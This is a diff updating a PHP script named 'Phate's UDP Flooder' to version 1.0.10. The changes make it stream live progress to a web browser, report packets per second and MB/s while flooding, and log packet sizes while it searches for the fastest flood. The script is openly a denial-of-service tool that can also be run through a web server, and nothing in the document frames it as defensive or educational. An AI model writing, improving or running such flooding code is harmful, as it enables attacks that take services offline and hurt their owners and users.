@@ -1,6 +1,6 @@
 <?php
 /*
-PUF: Phate's UDP Flooder V1.0.9
+PUF: Phate's UDP Flooder V1.0.10
 
 More info/latest version: 
 https://github.com/udp-flooder/puf
@@ -27,7 +27,7 @@ IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
 
-$version = '1.0.9'; $file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();
+$version = '1.0.10'; $file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();
 
 // Determine web/CLI
 if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
@@ -55,6 +55,17 @@ if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
 if (!isset($cli)) {
     set_time_limit(0);
     $cli = false;
+    @ini_set('output_buffering', 'off');
+    @ini_set('zlib.output_buffering', false);
+    @ini_set('zlib.output_compression', false);
+    @ini_set('implicit_flush', true);
+    for ($ob = 0; $ob < ob_get_level(); $ob++) {
+        ob_end_flush();
+    }
+    ob_implicit_flush(true);
+    header('Content-type: text/plain');
+    header('Cache-control: no-cache');
+    echo str_repeat(' ', 1024) . PHP_EOL; // fixes bugs
 }
 
 if ($cli) {
@@ -110,6 +121,10 @@ if (count($args) >= 2) {
         if ($cache && empty($cacheData)) {
             echo '- no cache available' . PHP_EOL;
             echo '- creating one takes a few seconds, hold on' . PHP_EOL;
+            if (!$cli) {
+                flush();
+                ob_flush();
+            }
         }
     }
     $size = isset($args[4]) ? intval($args[4]) : getSize();
@@ -137,6 +152,11 @@ if (count($args) >= 2) {
         }
         if ($last != time()) {
             echo str_pad(@round($pcks / $time, 2), 15) . "p/s     \t" . str_pad(@round(((($pcks * $size) / 1024) / 1024) / $time, 2), 7) . "MB/s    \t " . str_pad(($mxtm - time()), 5) ." seconds left    \r";
+            if (!$cli) {
+                echo PHP_EOL;
+                flush();
+                ob_flush();
+            }
             $last = time();
         }
     }
@@ -181,11 +201,15 @@ function getSize() {
         
         $toBeat = round( ($bestsize * $bestpackets) / 5 );
         $beatMe = round( ($size * $packets) / 5 );
+         $speed = round (($beatMe / 1024) / 1024, 2);
         if ($beatMe >= $toBeat) {
-            $speed = round (($beatMe / 1024) / 1024, 2);
-            echo '[Update] New speed: ' . $size . ' bytes, ' . $packets . '/s, ' . $speed . 'mB/s' . PHP_EOL;
+           
+            echo '[Update] New speed: ' . $size . ' bytes, ' . $packets . '/s, ' . $speed . 'MB/s' . PHP_EOL;
             $bestsize = $size;
             $bestpackets = $packets;
+        }
+        else {
+            echo '[Skipping] ' .$size . ' bytes, ' . $packets. '/s, ' . $speed . 'MB/s' . PHP_EOL;
         }
         sleep(1);
         $size += 5000;
